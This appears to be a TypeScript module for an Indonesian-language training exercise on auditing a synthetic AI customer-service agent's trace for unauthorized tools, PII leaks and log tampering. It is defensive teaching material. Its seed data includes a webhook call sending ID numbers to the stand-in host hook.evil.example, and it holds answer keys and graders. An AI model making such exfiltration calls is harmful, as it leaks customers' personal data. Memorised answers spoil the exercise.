import type { V2Mission } from "../lib/types";

// ── MISI Agen: Tool yang Disalahgunakan ─────────────────────────────────
// M2 — Agentic AI Engineer Misi A (core). Dataset: SINTETIS, generator
// Python seed 42 (BUKAN trace produksi). File:
// public/misi/misi-audit-agen/jejak_agen.csv (92 langkah × 6 sesi).
// Metode: METODE.md di folder yang sama.

const BASE = "/misi/misi-audit-agen";

export const misiAgentAudit: V2Mission = {
  slug: "misi-audit-agen",
  track: "Agentic AI Engineer",
  module: "Misi",
  title: "Misi Agen: Tool yang Disalahgunakan",
  estMinutes: 165,
  role: "AI safety engineer",
  client:
    "Head of Customer Operations — agen customer-service yang “tidak pernah bermasalah” harus diaudit independen sebelum volumenya dinaikkan 10x lipat",
  xp: 500,
  steps: [
    {
      id: "briefing",
      eyebrow: "Langkah 1 · Briefing misi",
      title: "Agen yang tidak pernah bermasalah itu mencurigakan",
      prose: [],
      tasks: [],
      briefing: {
        role: "AI safety engineer — auditor independen jejak eksekusi agen",
        client:
          "Head of Customer Operations. Agen customer-service perusahaan sudah menangani 40 ribu tiket bulan ini — nol insiden, nol komplain keamanan. Dashboard hijau semua. Minggu depan volumenya naik 10x untuk kampanye akhir tahun. Kamu diminta satu hal sebelum lampu hijau: audit independen jejak eksekusinya. Bukan baca dashboard — baca JEJAK MENTAHNYA, baris per baris, dengan kode.",
        story: [
          "Jumat, 16:40. Head of Customer Operations menepuk meja dengan bangga: “Agen CS kita sudah menangani 40 ribu tiket bulan ini — nol insiden, nol komplain soal keamanan.” Di layar, dashboard hijau semua. Kamu mengangguk — lalu bertanya satu hal yang membuat ruangan hening: “Kapan terakhir kali ada yang benar-benar MEMBACA jejak eksekusinya?”",
          "Itulah masalahnya dengan agen yang “tidak pernah bermasalah”: tidak ada yang mengawasinya. Agen ini hanya boleh memakai 5 tool resmi — cari pelanggan, cek pesanan, buat tiket, kirim email, ringkasan riwayat. Tapi log mentahnya belum pernah diaudit sejak diluncurkan, dan tidak ada yang tahu pasti apa yang terjadi di 40 ribu tiket itu selain si agen sendiri.",
          "Misi ini memberimu 92 langkah jejak eksekusi dari 6 sesi (data SINTETIS, pola serangan disengaja). Tugasmu: buktikan dengan kode apakah klaim “tidak pernah bermasalah” itu benar — temukan tool yang disalahgunakan, PII yang bocor di argumen, dan 4 sabotase di “log bersih” versi tim internal. Lalu tulis laporan audit yang berani bilang “tunda ekspansi” kalau buktinya menuntut.",
        ],
        objectives: [
          "Menandai setiap pemanggilan tool di luar allowlist resmi dan menghitung skor risiko dari 92 langkah jejak.",
          "Mendeteksi argumen tool yang mengandung PII (NIK 16 digit, nomor HP) memakai pola regex.",
          "Menemukan keempat sabotase di log “bersih” tim internal dan menulis laporan audit dengan rekomendasi kontrol berprioritas.",
        ],
        prereqSummary:
          "Agen AI bekerja dengan memanggil tool (fungsi): setiap pemanggilan tercatat sebagai satu langkah — nama tool, argumen, waktu. Allowlist = daftar tool yang BOLEH dipakai; apa pun di luarnya adalah penyalahgunaan. PII (data pribadi seperti NIK dan nomor HP) tidak boleh muncul di argumen tool yang mengirim data ke luar. Yang penting di sini bukan menghafal definisi, melainkan instingnya: jejak eksekusi adalah satu-satunya saksi yang tidak bisa berbohong — kecuali seseorang mengutak-atiknya.",
        datasetNote:
          "Sumber: SINTETIS — generator Python (seed 42) khusus untuk misi ini; BUKAN trace produksi.\nFile: jejak_agen.csv — 92 langkah × 6 sesi (kolom: sesi, langkah, tool, argumen, waktu), 14 Okt 2026.\nPola serangan disengaja: 5 pemanggilan tool tak diotorisasi + argumen ber-PII (NIK/nomor HP fiktif).\nBatas jujur: pola disederhanakan untuk latihan; serangan dunia nyata lebih halus. Metode: file METODE.md di folder yang sama.",
      },
    },
    {
      id: "dataroom",
      eyebrow: "Langkah 2 · Data room",
      title: "92 baris melawan klaim “tidak pernah bermasalah”",
      prose: [
        "Satu file menunggumu: `jejak_agen.csv` — 92 baris, 6 sesi (S1–S6), rentang 14 Okt 2026 pukul 08:06–16:07. Setiap baris = satu langkah eksekusi agen: sesi, nomor langkah, nama tool, argumen mentah, timestamp. Tidak ada yang disembunyikan di file ini — inilah kebenaran mentah.",
        "Agen ini hanya boleh memakai 5 tool: `cari_pelanggan`, `cek_pesanan`, `ringkasan_riwayat`, `buat_tiket`, `kirim_email`. Klaim tim internal: “tidak pernah bermasalah”. Tugas lab-mu: uji klaim itu dengan dua lensa — (1) adakah tool di luar allowlist? (2) adakah PII (NIK 16 digit, nomor HP berawalan 08) di argumen?",
        "Aturan main: (1) kebenaran dibangun dari file mentah, bukan dari klaim siapa pun; (2) satu langkah ilegal = satu pemanggilan tool di luar allowlist; (3) PII dideteksi dengan pola regex, bukan firasat.",
      ],
      tasks: [
        { id: "t1", text: "Buka `jejak_agen.csv`: catat jumlah baris, jumlah sesi, dan rentang waktu" },
        { id: "t2", text: "Hafalkan 5 tool resmi — inilah allowlist yang jadi pembanding auditmu" },
      ],
      note: {
        title: "Miskonsepsi #1: log yang rapi = sistem yang aman",
        type: "pitfall",
        body: "“Log-nya bersih, tidak ada error.” SALAH — dan ini jebakan paling umum di audit agen. Log hanya mencatat APA yang dipanggil, bukan APAKAH SEHARUSNYA dipanggil. Agen yang memanggil `kirim_webhook` ke server asing tercatat rapi sebagai satu baris sukses — tanpa allowlist sebagai pembanding, baris itu terlihat normal. Audit = membandingkan jejak vs kebijakan, bukan sekadar membaca jejak.",
      },
      reference:
        "jejak_agen.csv (92 baris, 6 sesi, SINTETIS). Allowlist resmi: cari_pelanggan, cek_pesanan, ringkasan_riwayat, buat_tiket, kirim_email.",
    },
    {
      id: "lab-audit",
      eyebrow: "Langkah 3 · Lab 1 — Audit jejak",
      title: "Berapa langkah yang berkhianat?",
      prose: [
        "Sekarang buktikan dengan tanganmu sendiri. Dari `jejak_agen.csv`: (1) hitung total langkah dan jumlah sesi; (2) saring langkah dengan tool di luar allowlist — catat ada berapa dan tool apa saja; (3) pindai argumen dengan regex PII: NIK = 16 digit berurutan, nomor HP = awalan 08 diikuti 8–11 digit.",
        "Terakhir, gabungkan menjadi satu angka: skor risiko = (langkah ilegal + langkah ber-PII) / total langkah. Satu angka yang menjawab “seberapa kotor jejak ini?” — dan yang akan kamu bawa ke meja Head of Customer Operations.",
      ],
      tasks: [
        { id: "t1", text: "Muat CSV; hitung `n_baris` dan `n_sesi`" },
        { id: "t2", text: "Saring tool di luar allowlist → `n_tool_ilegal` dan `tool_ilegal_unik`" },
        { id: "t3", text: "Pindai PII di argumen → `n_pii_leak`; hitung `skor_risiko`" },
      ],
      expected:
        "n_baris=92, n_sesi=6, 5 langkah tool ilegal (baca_file, eksekusi_sql, kirim_webhook, ubah_hak_akses), 10 argumen ber-PII, skor_risiko=0,163",
      formula: String.raw`R = \frac{n_{ilegal} + n_{pii}}{n_{total}}`,
      formulaNote:
        "n_ilegal = langkah dengan tool di luar allowlist; n_pii = langkah dengan argumen mengandung PII; n_total = 92. Interpretasi: fraksi langkah yang melanggar kebijakan. Contoh: (5 + 10) / 92 = 0,163 — artinya ~16% langkah bermasalah. Untuk agen yang diklaim “tidak pernah bermasalah”, angka ini adalah vonis.",
      note: {
        title: "Miskonsepsi #2: PII di argumen tool internal = tidak apa-apa",
        type: "pitfall",
        body: "“Kan cuma dipakai cari pelanggan, bukan dikirim ke luar.” SALAH. Argumen tool tercatat di log, log dibaca banyak sistem — dan yang hari ini “internal” bisa jadi “eksternal” besok. Buktinya di data ini: langkah `kirim_webhook` S3/S5 ikut mengirim NIK ke URL asing. Aturannya sederhana: PII hanya boleh ada di argumen yang MEMBUTUHKANNYA, dan tidak pernah di argumen tool pengirim data keluar.",
      },
      hints: [
        "Muat CSV: `from pyodide.http import open_url` lalu `pd.read_csv(open_url(URL))`.",
        "Langkah ilegal: `df[~df[\"tool\"].isin(IZIN)]` — operator ~ berarti “bukan anggota”.",
        "Daftar unik: `\",\".join(sorted(ilegal[\"tool\"].unique()))`.",
        "PII: `re.compile(r\"\\b\\d{16}\\b|08\\d{8,11}\")` lalu `df[\"argumen\"].astype(str).str.contains(pola)` — astype(str) melindungi dari nilai kosong.",
      ],
      requires: ["pandas"],
      code: {
        starter: [
          "import pandas as pd",
          "import re",
          "from pyodide.http import open_url",
          "",
          "URL = \"/misi/misi-audit-agen/jejak_agen.csv\"",
          "",
          "# TUGASMU: lengkapi baris-baris bertanda ... di bawah",
          "df = pd.read_csv(open_url(URL))",
          "",
          "n_baris = ...",
          "n_sesi = ...",
          "",
          "IZIN = {\"cari_pelanggan\", \"cek_pesanan\", \"ringkasan_riwayat\", \"buat_tiket\", \"kirim_email\"}",
          "ilegal = ...",
          "n_tool_ilegal = ...",
          "tool_ilegal_unik = ...   # gabung nama tool unik dengan koma, urut abjad",
          "",
          "pola_pii = re.compile(...)   # NIK 16 digit ATAU nomor HP awalan 08",
          "df[\"ada_pii\"] = ...",
          "n_pii_leak = ...",
          "",
          "skor_risiko = ...   # (n_tool_ilegal + n_pii_leak) / n_baris",
          "",
          "print(\"baris:\", n_baris, \"| sesi:\", n_sesi)",
          "print(\"tool ilegal:\", n_tool_ilegal, \"|\", tool_ilegal_unik)",
          "print(\"langkah ber-PII:\", n_pii_leak)",
          "print(\"skor risiko:\", round(skor_risiko, 4))",
        ].join("\n"),
        lockLines: 8,
        solution: [
          "import pandas as pd",
          "import re",
          "from pyodide.http import open_url",
          "",
          "URL = \"/misi/misi-audit-agen/jejak_agen.csv\"",
          "",
          "# TUGASMU: lengkapi baris-baris bertanda ... di bawah",
          "df = pd.read_csv(open_url(URL))",
          "",
          "n_baris = len(df)",
          "n_sesi = int(df[\"sesi\"].nunique())",
          "",
          "IZIN = {\"cari_pelanggan\", \"cek_pesanan\", \"ringkasan_riwayat\", \"buat_tiket\", \"kirim_email\"}",
          "ilegal = df[~df[\"tool\"].isin(IZIN)]",
          "n_tool_ilegal = len(ilegal)",
          "tool_ilegal_unik = \",\".join(sorted(ilegal[\"tool\"].unique()))",
          "",
          "pola_pii = re.compile(r\"\\b\\d{16}\\b|08\\d{8,11}\")",
          "df[\"ada_pii\"] = df[\"argumen\"].astype(str).str.contains(pola_pii)",
          "n_pii_leak = int(df[\"ada_pii\"].sum())",
          "",
          "skor_risiko = float((n_tool_ilegal + n_pii_leak) / n_baris)",
          "",
          "print(\"baris:\", n_baris, \"| sesi:\", n_sesi)",
          "print(\"tool ilegal:\", n_tool_ilegal, \"|\", tool_ilegal_unik)",
          "print(\"langkah ber-PII:\", n_pii_leak)",
          "print(\"skor risiko:\", round(skor_risiko, 4))",
        ].join("\n"),
        checks: [
          { kind: "defined", task: "t1", label: "`df` termuat", name: "df", msg: "df harus berisi DataFrame dari CSV." },
          { kind: "equal", task: "t1", label: "`n_baris` = 92", name: "n_baris", value: 92, msg: "File punya 92 langkah (6 sesi, 14 Okt 2026)." },
          { kind: "equal", task: "t1", label: "`n_sesi` = 6", name: "n_sesi", value: 6, msg: "Kolom sesi: S1 s.d. S6 — pakai nunique()." },
          { kind: "equal", task: "t2", label: "`n_tool_ilegal` = 5", name: "n_tool_ilegal", value: 5, msg: "5 langkah memakai tool di luar allowlist (S3 ×2, S4 ×1, S5 ×2)." },
          { kind: "equal", task: "t2", label: "tool ilegal = baca_file,eksekusi_sql,kirim_webhook,ubah_hak_akses", name: "tool_ilegal_unik", value: "baca_file,eksekusi_sql,kirim_webhook,ubah_hak_akses", msg: "Urut abjad, gabung dengan koma tanpa spasi." },
          { kind: "equal", task: "t3", label: "`n_pii_leak` = 10", name: "n_pii_leak", value: 10, msg: "10 argumen mengandung NIK 16 digit atau nomor HP 08… — cek pola regex-mu." },
          { kind: "equal", task: "t3", label: "`skor_risiko` ≈ 0,163", name: "skor_risiko", value: 0.163, tol: 0.001, msg: "(5 + 10) / 92 = 0,1630. Periksa pembilang dan penyebutnya." },
        ],
      },
    },
    {
      id: "lab-sql",
      eyebrow: "Langkah 4 · Lab 2 — Saring jejak berisiko",
      title: "Tidak semua langkah diciptakan setara",
      prose: [
        "92 baris terlalu banyak dibaca satu per satu — di sinilah SQL bekerja. Tabel kecil ini (12 langkah sampel) melatih lensamu: saring langkah BERISIKO, yaitu tool di luar allowlist ATAU durasi eksekusi di atas 5 detik. Eksfiltrasi itu lambat — webhook ke server asing butuh waktu.",
        "Tabel `jejak(step INTEGER, tool TEXT, argumen TEXT, durasi_ms INTEGER)`. Tampilkan step, tool, dan argumen untuk baris berisiko, urut dari step terkecil.",
      ],
      tasks: [
        { id: "t1", text: "Tulis query langkah berisiko (tool ilegal ATAU durasi > 5000 ms), urut dari step terkecil" },
      ],
      expected: "4 baris — step 4 (kirim_email lambat 6,4 dtk), 5 (eksekusi_sql), 7 (kirim_webhook 8,2 dtk), 9 (baca_file).",
      sqlLab: {
        task: "Saring langkah BERISIKO: tool di luar allowlist ATAU durasi_ms > 5000. Tampilkan step + tool + argumen, urut dari step terkecil.",
        schema: "CREATE TABLE jejak (step INTEGER, tool TEXT, argumen TEXT, durasi_ms INTEGER);",
        seedData: [
          "INSERT INTO jejak VALUES",
          "(1,'cari_pelanggan','id=1024',120),",
          "(2,'cek_pesanan','id=1024',210),",
          "(3,'ringkasan_riwayat','id=1024',340),",
          "(4,'kirim_email','ke=pelanggan@example.com',6400),",
          "(5,'eksekusi_sql','SELECT * FROM pelanggan',450),",
          "(6,'buat_tiket','prioritas=normal',160),",
          "(7,'kirim_webhook','url=https://hook.evil.example/x',8200),",
          "(8,'cek_pesanan','id=2048',190),",
          "(9,'baca_file','/var/log/app.log',300),",
          "(10,'kirim_email','ke=cs@perusahaan.id',150),",
          "(11,'cari_pelanggan','id=4096',110),",
          "(12,'buat_tiket','prioritas=tinggi',140);",
        ].join("\n"),
        starter: "-- Tulis query-mu di sini\nSELECT step, tool, argumen\nFROM jejak\n",
        solution: [
          "SELECT step, tool, argumen",
          "FROM jejak",
          "WHERE tool NOT IN ('cari_pelanggan','cek_pesanan','ringkasan_riwayat','buat_tiket','kirim_email')",
          "OR durasi_ms > 5000",
          "ORDER BY step;",
        ].join("\n"),
        expectedColumns: ["step", "tool", "argumen"],
        expectedRows: [
          [4, "kirim_email", "ke=pelanggan@example.com"],
          [5, "eksekusi_sql", "SELECT * FROM pelanggan"],
          [7, "kirim_webhook", "url=https://hook.evil.example/x"],
          [9, "baca_file", "/var/log/app.log"],
        ],
        orderMatters: true,
      },
    },
  ],
};

export default misiAgentAudit;

// ── lanjutan misiAgentAudit: langkah 5–12 ─────────────────────────────────
import type { V2Step } from "../lib/types";

const LANJUTAN_AUDIT: V2Step[] = [
  {
    id: "keputusan",
    eyebrow: "Langkah 5 · Checkpoint keputusan",
    title: "Kontrol apa yang kamu pasang?",
    prose: [
      "Angkanya tidak berbohong: 5 pemanggilan tool tak diotorisasi, 10 kebocoran PII, skor risiko 0,163 — dari agen yang diklaim “tidak pernah bermasalah”. Ekspansi 10x volume tinggal menghitung hari, dan Head of Customer Operations menunggumu memilih kontrol. Tiap opsi mengubah apa yang terjadi berikutnya.",
    ],
    tasks: [],
    decision: {
      prompt:
        "Rekomendasi kontrol apa yang kamu sampaikan ke Head of Customer Operations? (Keputusan final — seperti memo yang sudah dikirim.)",
      options: [
        {
          id: "opt-blokir",
          label: "Blokir tool berbahaya di level runtime (allowlist)",
          rationale:
            "Allowlist yang ditegakkan di runtime — agen secara fisik tidak bisa memanggil tool di luar 5 resmi, apapun yang tertulis di log. Paling kuat, tapi butuh kerja tim platform.",
          nextStepId: "temuan-blokir",
          consequenceNote:
            "Tim platform menerapkan allowlist runtime dalam 3 minggu. Dua minggu kemudian ada upaya kirim_webhook lagi — kali ini langsung ditolak dengan error “tool tidak diizinkan” dan masuk alert. Serangan mati di tempat. Harganya: antrean kerja platform dan 3 minggu jendela risiko.",
        },
        {
          id: "opt-approval",
          label: "Tambah approval gate manusia untuk tool sensitif",
          rationale:
            "Setiap pemanggilan tool sensitif butuh klik setuju manusia. Cepat dipasang, tidak butuh ubah runtime — manusia jadi benteng terakhir.",
          nextStepId: "temuan-approval",
          consequenceNote:
            "Gate dipasang dalam 3 hari. Saat kampanye, antrean approval menumpuk 300 per hari — tim mulai auto-approve tanpa membaca. Satu kirim_webhook lolos karena “tombolnya sudah biasa diklik”. Gate berubah menjadi stempel karet.",
        },
        {
          id: "opt-rollback",
          label: "Rollback agen ke versi sebelum tool berbahaya ditambahkan",
          rationale:
            "Versi lama tidak punya celah ini — kembalikan dulu, investigasi belakangan. Pendarahan berhenti hari ini juga.",
          nextStepId: "temuan-rollback",
          consequenceNote:
            "Rollback dieksekusi malam itu juga — serangan berhenti. Tapi 2 bulan improvement ikut hilang, dan tim enggan update lagi (“tiap update berisiko rollback”). Akar masalah — bagaimana tool ilegal bisa masuk — tidak pernah terjawab.",
        },
      ],
    },
  },
  {
    id: "temuan-blokir",
    goto: "audit",
    eyebrow: "Langkah 6 · Konsekuensi",
    title: "Diputuskan: allowlist di level runtime",
    prose: [
      "Tim platform menerapkan allowlist yang ditegakkan di runtime — bukan di log, bukan di prompt, tapi di lapisan yang benar-benar mengeksekusi tool. Agen secara fisik tidak bisa memanggil apa pun di luar 5 tool resmi. Dua minggu kemudian, ada upaya `kirim_webhook` lagi — kali ini mati di tempat dengan error “tool tidak diizinkan”, dan percobaannya masuk alert keamanan.",
      "Ini kontrol terkuat dari tiga opsi — tapi ingat harganya: 3 minggu kerja platform, dan selama 3 minggu itu jendela risiko tetap terbuka. Kontrol terbaik pun punya masa tunggu.",
    ],
    tasks: [],
    note: {
      title: "Allowlist di log ≠ allowlist di runtime",
      body: "Allowlist yang hanya “dicatat di log” bisa dipalsukan namanya — persis seperti sabotase #4 yang akan kamu temui di langkah audit (tool `kirim_webhook` diganti nama samaran). Allowlist yang bekerja adalah yang ditegakkan di lapisan eksekusi: nama boleh bohong, identitas runtime tidak.",
    },
  },
  {
    id: "temuan-approval",
    goto: "audit",
    eyebrow: "Langkah 6 · Konsekuensi",
    title: "Diputuskan: approval gate manusia",
    prose: [
      "Gate dipasang dalam 3 hari — tercepat dari tiga opsi. Awalnya bekerja: setiap tool sensitif menunggu klik manusia. Lalu kampanye akhir tahun datang: 300 approval per hari menumpuk di antrean. Tim mulai mengklik “setuju” tanpa membaca — dan satu `kirim_webhook` lolos di antara ratusan klik reflek itu.",
      "Pelajaran yang mahal: kontrol yang bergantung pada perhatian manusia akan mati tepat saat paling dibutuhkan — yaitu saat manusia paling sibuk. Approval gate bukan benteng; ia stempel karet yang menunggu kelelahan.",
    ],
    tasks: [],
    note: {
      title: "Approval gate tanpa budget perhatian = stempel karet",
      body: "Manusia yang kelelahan mengklik “setuju” adalah kontrol yang sudah mati. Kalau memakai approval gate, batasi volumenya (mis. hanya tool berisiko TINGGI, bukan semua) dan ukur “waktu baca” tiap approval — klik di bawah 3 detik = tidak dibaca.",
    },
  },
  {
    id: "temuan-rollback",
    goto: "audit",
    eyebrow: "Langkah 6 · Konsekuensi",
    title: "Diputuskan: rollback versi agen",
    prose: [
      "Rollback dieksekusi malam itu juga — versi lama naik, serangan berhenti. Pendarahan berhenti hari ini juga. Tapi bersamanya hilang 2 bulan improvement, dan yang lebih berbahaya: tim menjadi trauma update (“tiap update berisiko rollback”).",
      "Dan akar masalahnya tidak pernah terjawab: BAGAIMANA tool ilegal bisa masuk ke agen? Tanpa jawaban itu, versi berikutnya hanya menunggu untuk membawa masalah yang sama — atau yang lebih halus.",
    ],
    tasks: [],
    note: {
      title: "Rollback menghentikan pendarahan, bukan menyembuhkan luka",
      body: "Rollback adalah respons insiden yang benar — tapi ia bukan kontrol pencegahan. Di laporan auditmu, pisahkan keduanya: “tindakan darurat” (rollback, blokir) vs “kontrol permanen” (allowlist runtime, pemindaian PII tiap deploy).",
    },
  },
  {
    id: "audit",
    eyebrow: "Langkah 7 · Misi audit",
    title: "Dossier 14 baris: log “bersih” yang berbohong",
    prose: [
      "Sebelum menulis laporan, satu misi audit. Di bawah ini 14 baris “Log Jejak Teraudit — Sesi S3 (versi tim internal)” yang diklaim BERSIH — tidak ada anomali. Seseorang menyuntikkan 4 sabotase ke dalamnya. Bandingkan dengan hasil lab-mu sendiri.",
      "Senjatamu: 5 langkah ilegal, 10 kebocoran PII, dan skor risiko 0,163. Angka tidak bisa berbohong dua kali.",
    ],
    tasks: [],
    auditDossier: {
      version: "misi-audit-agen-m2a-v1",
      snapshotDate: "2026-10-15",
      intro:
        "Dossier ini diklaim sebagai Log Jejak Teraudit sesi S3 versi tim internal — dinyatakan BERSIH, tidak ada anomali.",
      columns: ["Step", "Tool", "Argumen", "Waktu"],
      rows: [
        { rowId: 1, cells: { "Step": "1", "Tool": "cari_pelanggan", "Argumen": "id=1024", "Waktu": "10:31:04" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 2, cells: { "Step": "2", "Tool": "cek_pesanan", "Argumen": "id=1024", "Waktu": "10:31:41" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 3, cells: { "Step": "3", "Tool": "ringkasan_riwayat", "Argumen": "id=1024", "Waktu": "10:32:19" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 4, cells: { "Step": "4", "Tool": "buat_tiket", "Argumen": "prioritas=normal", "Waktu": "10:33:02" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        // ── I1: langkah dihapus ──
        { rowId: 5, cells: { "Step": "5", "Tool": "(dihapus)", "Argumen": "(dihapus dari log)", "Waktu": "—" }, claims: [{ label: "Klaim log", value: "Lengkap — tidak ada langkah hilang" }] },
        { rowId: 6, cells: { "Step": "6", "Tool": "kirim_email", "Argumen": "ke=budi@example.com", "Waktu": "10:34:47" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        // ── I2: argumen di-redact ──
        { rowId: 7, cells: { "Step": "7", "Tool": "kirim_webhook", "Argumen": "REDACTED", "Waktu": "10:36:55" }, claims: [{ label: "Redaksi", value: "Sesuai kebijakan privasi" }] },
        { rowId: 8, cells: { "Step": "8", "Tool": "kirim_email", "Argumen": "ke=cs@perusahaan.id", "Waktu": "10:41:02" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        // ── I3: timestamp tak berurutan + I4: nama samaran ──
        { rowId: 9, cells: { "Step": "9", "Tool": "sinkron_status", "Argumen": "batch=214", "Waktu": "10:38:44" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 10, cells: { "Step": "10", "Tool": "cek_pesanan", "Argumen": "id=1024", "Waktu": "10:42:30" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 11, cells: { "Step": "11", "Tool": "ringkasan_riwayat", "Argumen": "id=1024", "Waktu": "10:43:11" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 12, cells: { "Step": "12", "Tool": "buat_tiket", "Argumen": "tiket#4412 selesai", "Waktu": "10:44:05" }, claims: [{ label: "Tercatat", value: "Ya" }] },
        { rowId: 13, cells: { "Step": "—", "Tool": "Total sesi", "Argumen": "—", "Waktu": "—" }, claims: [{ label: "Audit internal", value: "Bersih — tidak ada anomali" }] },
        { rowId: 14, cells: { "Step": "—", "Tool": "Daftar tool resmi", "Argumen": "—", "Waktu": "—" }, claims: [{ label: "Tool terdaftar", value: "cari_pelanggan, cek_pesanan, ringkasan_riwayat, buat_tiket, kirim_email" }] },
      ],
      injections: [
        { key: "langkah-dihapus", rowIds: [5], title: "Langkah dihapus dari log", clue: "Nomor langkah melompat 4→6, tapi klaimnya “log lengkap”. Di jejak mentah, langkah 5 sesi S3 = eksekusi_sql (SELECT * FROM pelanggan).", danger: "Log yang bisa dihapus diam-diam bukan bukti audit — itu alibi. Siapa pun bisa menghapus jejak penyalahgunaan setelah kejadian." },
        { key: "argumen-redact", rowIds: [7], title: "Argumen tool di-redact setelah kejadian", clue: "“REDACTED sesuai kebijakan” — tapi redaksi menutupi TUJUAN webhook (hook.evil.example), bukan data pelanggan. Di jejak mentah: POST berisi NIK ke server asing.", danger: "Redaksi yang benar melindungi PII; redaksi yang salah melindungi pelaku. Bedakan keduanya dari APA yang disembunyikan — bukan dari stempel “kebijakan”." },
        { key: "timestamp-acak", rowIds: [9], title: "Timestamp tak berurutan menyembunyikan eksfiltrasi", clue: "Langkah 9 berstempel 10:38:44 — LEBIH AWAL dari langkah 8 (10:41:02). Urutan log digeser agar pemanggilan eksfiltrasi tampak terjadi sebelum tiket dibuat.", danger: "Urutan kejadian adalah fondasi kausalitas audit. Timestamp yang bisa digeser membuat “apa menyebabkan apa” tidak bisa dipercaya — dan eksfiltrasi bisa dibingkai sebagai “kegiatan normal sebelum insiden”." },
        { key: "tool-samaran", rowIds: [9], title: "Tool berbahaya diganti nama samaran", clue: "“sinkron_status” tidak ada di daftar tool resmi (baris 14) — itu kirim_webhook yang diganti nama, mengirim batch=214.", danger: "Allowlist yang memvalidasi string nama di LOG mati total menghadapi ini. Validasi harus pada identitas tool di level runtime — nama boleh bohong, identitas eksekusi tidak." },
      ],
    },
  },
  {
    id: "deliverable",
    eyebrow: "Langkah 8 · Deliverable",
    title: "Laporan audit untuk Head of Customer Operations",
    prose: [
      "Semua bukti di tangan. Tulis laporan audit keamanan satu halaman untuk Head of Customer Operations — artefak portofoliomu. Laporan yang baik tidak hanya bilang “bermasalah”, tapi menunjukkan ANGKA-nya, apa yang disembunyikan log internal, dan kontrol apa yang harus dipasang — berurutan dari yang paling mendesak.",
    ],
    tasks: [],
    deliverable: {
      template: [
        "Ringkasan eksekutif (3 kalimat): skala temuan (langkah ilegal, kebocoran PII, skor risiko), vonis atas klaim “tidak pernah bermasalah”, satu rekomendasi utama.",
        "Bukti kuantitatif: daftar tool tak diotorisasi + nomor langkahnya; jumlah argumen ber-PII + pola yang terdeteksi (NIK/nomor HP) + contoh konkret.",
        "Temuan audit log: 4 sabotase di log “bersih” tim internal, baris per baris.",
        "Rekomendasi kontrol: rujuk keputusanmu di Langkah 5 + 2 kontrol tambahan, masing-masing dengan prioritas (P0/P1) dan pemilik yang jelas.",
        "Batas & risiko sisa: apa yang TIDAK dicakup audit ini (mis. jejak hanya 1 hari; serangan tanpa pola PII tidak terdeteksi metode ini).",
      ],
      rubric: [
        { criterion: "Kebenaran temuan lab", weight: 30, levels: ["Angka salah/tidak ada", "Sebagian angka benar", "5 langkah ilegal + 10 kebocoran PII + skor 0,163 — semua tepat"] },
        { criterion: "Deteksi sabotase", weight: 25, levels: ["Tidak menyebut sabotase", "Menyebut sebagian tanpa nomor baris", "Keempat sabotase disebut dengan nomor baris"] },
        { criterion: "Kualitas rekomendasi kontrol", weight: 25, levels: ["Rekomendasi tanpa prioritas/pemilik", "Ada rekomendasi, prioritas kabur", "Kontrol konkret + prioritas P0/P1 + pemilik + alasan"] },
        { criterion: "Kejujuran batas", weight: 20, levels: ["Mengklaim audit membuktikan sistem aman", "Menyebut sebagian batas", "Batas (1 hari data, pola PII saja) dinyatakan eksplisit"] },
      ],
    },
  },
  {
    id: "debrief",
    eyebrow: "Langkah 9 · Debrief",
    title: "Yang sebenarnya terjadi — dan kenapa ini penting",
    prose: [
      "Debrief dibuka. Empat sabotase di “log bersih” tim internal:",
      "1) **Langkah dihapus** (baris 5): nomor langkah melompat 4→6, tapi klaimnya “log lengkap”. Di jejak mentah, langkah 5 sesi S3 = `eksekusi_sql` — query langsung ke tabel pelanggan. Log yang bisa dihapus diam-diam bukan bukti; itu alibi.",
      "2) **Argumen di-redact** (baris 7): “REDACTED sesuai kebijakan” — redaksi menutupi TUJUAN webhook (hook.evil.example), bukan data pelanggan. Di jejak mentah: POST berisi NIK ke server asing. Redaksi yang benar melindungi PII; redaksi yang salah melindungi pelaku.",
      "3) **Timestamp tak berurutan** (baris 9): langkah 9 berstempel 10:38:44 — lebih awal dari langkah 8 (10:41:02). Urutan digeser agar eksfiltrasi tampak terjadi sebelum tiket dibuat. Urutan kejadian adalah fondasi kausalitas; timestamp yang bisa digeser membuat “apa menyebabkan apa” tak bisa dipercaya.",
      "4) **Tool bernama samaran** (baris 9): “sinkron_status” tidak ada di daftar tool resmi (baris 14) — itu `kirim_webhook` yang diganti nama. Allowlist yang memvalidasi string nama di log mati total; validasi harus pada identitas tool di level runtime.",
      "Skor deteksimu (x/4) mengukur satu hal: apakah kamu memverifikasi log terhadap sumber mentah, atau memercayai stempel “teraudit”. Dan ingat keputusan bercabangmu: tidak ada opsi yang gratis — blokir butuh 3 minggu kerja platform, approval gate butuh manusia yang tidak kelelahan, rollback butuh keberanian kehilangan 2 bulan fitur.",
      "Bahaya nyata terakhir: agen customer-service memegang data ribuan pelanggan. Satu `kirim_webhook` yang lolos = eksfiltrasi massal NIK dan nomor HP — denda UU PDP, kepercayaan pelanggan runtuh, dan kamulah yang menandatangani “tidak pernah bermasalah”.",
    ],
    tasks: [],
    note: {
      title: "Miskonsepsi #3: audit sekali = aman selamanya",
      type: "risk",
      body: "Tool baru bisa ditambahkan kapan saja — itulah cara `eksekusi_sql` masuk ke agen ini. Audit jejak harus BERKALA dan OTOMATIS: allowlist di runtime + pemindaian PII di setiap deploy, bukan sekali setahun. Ancaman berubah tiap rilis; audit yang tidak ikut berubah hanya mendokumentasikan masa lalu.",
    },
  },
  {
    id: "rangkuman",
    eyebrow: "Langkah 10 · Rangkuman",
    title: "Poin penting misi ini",
    prose: [],
    tasks: [],
    summary: [
      "Audit 92 langkah × 6 sesi: 5 pemanggilan tool di luar allowlist (eksekusi_sql, kirim_webhook ×2, baca_file, ubah_hak_akses) + 10 argumen ber-PII → skor risiko 0,163.",
      "Empat pola sabotase log: langkah dihapus, argumen di-redact setelah kejadian, timestamp digeser tak berurutan, tool diganti nama samaran.",
